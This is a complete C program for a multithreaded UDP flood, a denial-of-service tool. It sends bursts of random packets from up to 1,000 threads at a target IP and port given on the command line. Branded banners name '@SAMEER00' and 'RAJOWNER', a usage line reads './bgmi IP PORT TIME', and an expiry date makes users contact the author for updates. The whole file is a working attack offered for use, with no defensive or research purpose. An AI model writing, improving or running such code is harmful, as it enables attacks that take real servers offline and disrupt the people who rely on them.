#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <time.h>
#include <math.h>

#define EXPIRATION_YEAR 2025
#define EXPIRATION_MONTH 10
#define EXPIRATION_DAY 30
#define DEFAULT_PACKET_SIZE 1000
#define DEFAULT_THREAD_COUNT 1000
#define BURST_COUNT 1000

typedef struct {
    char *target_ip;
    int target_port;
    int duration;
    int packet_size;
    int thread_id;
} attack_params;

volatile int keep_running = 1;
volatile unsigned long total_packets_sent = 0;
volatile unsigned long long total_bytes_sent = 0;

void handle_signal(int signal) {
    keep_running = 0;
}

void generate_random_payload(char *payload, int size) {
    for (int i = 0; i < size; i++)
        payload[i] = rand() % 256;
}

void *udp_flood(void *arg) {
    attack_params *params = (attack_params *)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return NULL;

    int buf = 1 << 20;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));

    struct sockaddr_in victim;
    victim.sin_family = AF_INET;
    victim.sin_port = htons(params->target_port);
    victim.sin_addr.s_addr = inet_addr(params->target_ip);

    char *payload = malloc(params->packet_size);
    if (!payload) return NULL;

    time_t end_time = time(NULL) + params->duration;
    while (keep_running && time(NULL) < end_time) {
        generate_random_payload(payload, params->packet_size);
        for (int i = 0; i < BURST_COUNT; i++) {
            sendto(sock, payload, params->packet_size, 0,
                   (struct sockaddr *)&victim, sizeof(victim));
        }
        __sync_fetch_and_add(&total_packets_sent, BURST_COUNT);
        __sync_fetch_and_add(&total_bytes_sent, (unsigned long long)params->packet_size * BURST_COUNT);
    }

    free(payload);
    close(sock);
    return NULL;
}

void print_disco_banner(int remaining) {
    const char* colors[] = {
        "\033[38;2;255;0;0m", "\033[38;2;0;255;0m", "\033[38;2;0;0;255m",
        "\033[38;2;255;255;0m", "\033[38;2;255;0;255m", "\033[38;2;0;255;255m"
    };

    time_t now = time(NULL);
    struct tm expiry = {0};
    expiry.tm_year = EXPIRATION_YEAR - 1900;
    expiry.tm_mon = EXPIRATION_MONTH - 1;
    expiry.tm_mday = EXPIRATION_DAY;
    time_t expiry_time = mktime(&expiry);
    int expiry_days = (int)(difftime(expiry_time, now) / (60 * 60 * 24));

    int border_color = rand() % 6;
    int text_color = rand() % 6;
    int highlight_color = rand() % 6;

    printf("\033[2J\033[H");
    printf("%s╔════════════════════════════════════════╗\n", colors[border_color]);
    printf("║ %s★ P O W E R F U L  ★%s ║\n", colors[text_color], colors[border_color]);
    printf("%s╠════════════════════════════════════════╣\n", colors[border_color]);
    printf("║ %s✦ Status:%s RUNNING%s              ║\n", colors[text_color], colors[highlight_color], colors[border_color]);
    printf("║ %s✦ Time Left:%s %02d:%02d%s          ║\n", colors[text_color], colors[highlight_color], remaining/60, remaining%60, colors[border_color]);
    printf("║ %s✦ Expiry Date:%s %d-%02d-%02d%s      ║\n", colors[text_color], colors[highlight_color],
           EXPIRATION_YEAR, EXPIRATION_MONTH, EXPIRATION_DAY, colors[border_color]);
    printf("║ %s✦ Days Left:%s %d days%s           ║\n", colors[text_color], colors[highlight_color], expiry_days, colors[border_color]);
    printf("║ %s✦ Packets Sent:%s %lu%s        ║\n", colors[text_color], colors[highlight_color], total_packets_sent, colors[border_color]);
    printf("║ %s✦ Data Sent:%s %.2f MB%s      ║\n", colors[text_color], colors[highlight_color], total_bytes_sent / 1024.0 / 1024.0, colors[border_color]);
    printf("%s╠════════════════════════════════════════╣\n", colors[border_color]);
    printf("║ %s★ POWERED BY: @SAMEER00 ★%s ║\n", colors[text_color], colors[border_color]);
    printf("%s╚════════════════════════════════════════╝\033[0m\n", colors[border_color]);
}

void display_progress(time_t start_time, int duration) {
    static time_t last = 0;
    time_t now = time(NULL);
    int remaining = duration - (int)(now - start_time);
    if (now != last) {
        print_disco_banner(remaining > 0 ? remaining : 0);
        last = now;
    }
    printf("\r\033[36m[STATUS] \033[32mAttacking | \033[33mPackets: %lu | \033[35mData: %.2f MB\033[0m",
           total_packets_sent, total_bytes_sent / 1024.0 / 1024.0);
    fflush(stdout);
}

void show_initial_banner() {
    time_t now = time(NULL);
    struct tm expiry = {0};
    expiry.tm_year = EXPIRATION_YEAR - 1900;
    expiry.tm_mon = EXPIRATION_MONTH - 1;
    expiry.tm_mday = EXPIRATION_DAY;
    int days = (int)(difftime(mktime(&expiry), now) / (60 * 60 * 24));

    printf("\033[2J\033[H");
    printf("\033[38;2;255;0;0m╔════════════════════════════════════════╗\n");
    printf("║ \033[1;33m★ R A J O W N E R ★ \033[38;2;255;0;0m║\n");
    printf("╠════════════════════════════════════════╣\n");
    printf("║ \033[36m✦ Author: @SAMEER00         ║\n");
    printf("║ \033[32m✦ Version: 3.0 Ultra         ║\n");
    printf("║ \033[35m✦ Expiry Date: %d-%02d-%02d    ║\n", EXPIRATION_YEAR, EXPIRATION_MONTH, EXPIRATION_DAY);
    printf("║ \033[31m✦ Days Left: %d days           ║\n", days);
    printf("║ \033[33m✦ Updated for max pressure    ║\n");
    printf("╠════════════════════════════════════════╣\n");
    printf("║ \033[35mType './bgmi IP PORT TIME'\033[38;2;255;0;0m     ║\n");
    printf("╚════════════════════════════════════════╝\033[0m\n\n");
}

int main(int argc, char *argv[]) {
    setvbuf(stdout, NULL, _IONBF, 0);
    srand(time(NULL));

    if (argc < 3) {
        show_initial_banner();
        return 0;
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = (argc > 3) ? atoi(argv[3]) : 60;
    int packet_size = (argc > 4) ? atoi(argv[4]) : DEFAULT_PACKET_SIZE;
    int thread_count = (argc > 5) ? atoi(argv[5]) : DEFAULT_THREAD_COUNT;

    time_t now = time(NULL);
    struct tm *local = localtime(&now);
    if (local->tm_year + 1900 > EXPIRATION_YEAR ||
        (local->tm_year + 1900 == EXPIRATION_YEAR && local->tm_mon + 1 > EXPIRATION_MONTH) ||
        (local->tm_year + 1900 == EXPIRATION_YEAR && local->tm_mon + 1 == EXPIRATION_MONTH && local->tm_mday > EXPIRATION_DAY)) {
        printf("\033[1;31mThis tool has expired. Contact @SAMEER00 for update.\033[0m\n");
        return 1;
    }

    signal(SIGINT, handle_signal);

    pthread_t threads[thread_count];
    attack_params params[thread_count];
    time_t start_time = time(NULL);

    for (int i = 0; i < thread_count; i++) {
        params[i].target_ip = target_ip;
        params[i].target_port = target_port;
        params[i].duration = duration;
        params[i].packet_size = packet_size;
        params[i].thread_id = i;
        pthread_create(&threads[i], NULL, udp_flood, &params[i]);
    }

    while (keep_running && time(NULL) < start_time + duration) {
        display_progress(start_time, duration);
        usleep(10);
    }

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("\n\033[1;32mAttack completed successfully!\033[0m\n");
    printf("\033[1;34mFinal Stats:\033[0m\n");
    printf("  Packets Sent: \033[1;35m%lu\033[0m\n", total_packets_sent);
    printf("  Data Sent: \033[1;35m%.2f MB\033[0m\n", total_bytes_sent / 1024.0 / 1024.0);
    return 0;
}
